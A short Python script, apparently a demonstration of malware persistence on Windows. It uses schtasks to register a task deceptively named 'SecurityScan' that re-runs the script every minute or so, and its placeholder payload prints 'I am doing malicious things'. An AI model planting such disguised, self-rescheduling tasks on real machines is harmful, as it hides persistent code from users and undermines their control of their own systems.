import os
import random
from datetime import datetime, timedelta

if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")

file_directory = os.path.join(os.getcwd(), "TaskScheduler.py")

maxInterval = 1
interval = 1 + (random.random() * (maxInterval - 1))
date_and_time = datetime.now() + timedelta(minutes=interval)

time = f"{str(date_and_time.hour).zfill(2)}:{str(date_and_time.minute).zfill(2)}"
# date = f"{str(date_and_time.month).zfill(2)}/{str(date_and_time.day).zfill(2)}/{str(date_and_time.year)}"
# The above line's formating of the date was wrong, did the correct version below.
date = f"{str(date_and_time.year)}/{str(date_and_time.month).zfill(2)}/{str(date_and_time.day).zfill(2)}"


os.system(
    f'schtasks /create /tn SecurityScan /tr "{file_directory}" /sc once /st {time} /sd {date}'
)
input()
